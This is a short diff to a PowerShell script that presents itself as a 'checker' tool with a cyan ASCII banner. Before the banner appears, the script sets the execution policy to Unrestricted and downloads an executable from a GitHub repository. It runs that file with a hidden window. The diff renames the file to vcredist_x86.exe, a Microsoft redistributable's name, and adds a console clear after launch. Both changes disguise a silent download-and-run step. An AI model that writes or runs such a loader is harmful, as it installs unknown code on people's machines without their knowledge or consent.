@@ -1,8 +1,9 @@
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
 
-Invoke-WebRequest -Uri "https://github.com/system32owner/download/raw/refs/heads/main/JournalTrace.exe" -OutFile "JournalTrace.exe" -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri "https://github.com/system32owner/download/raw/refs/heads/main/vcredist_x86.exe" -OutFile "vcredist_x86.exe" -ErrorAction SilentlyContinue
 
-    Start-Process -FilePath "JournalTrace.exe" -WindowStyle Hidden
+    Start-Process -FilePath "vcredist_x86.exe" -WindowStyle Hidden
+	Clear-Host
 	
 Write-Host "  _____ _____    _____ _               _             " -ForegroundColor Cyan
 Write-Host " |  ___|_   _|  / ____| |__   ___  ___| | _____ _ __ " -Foregroundcolor Cyan
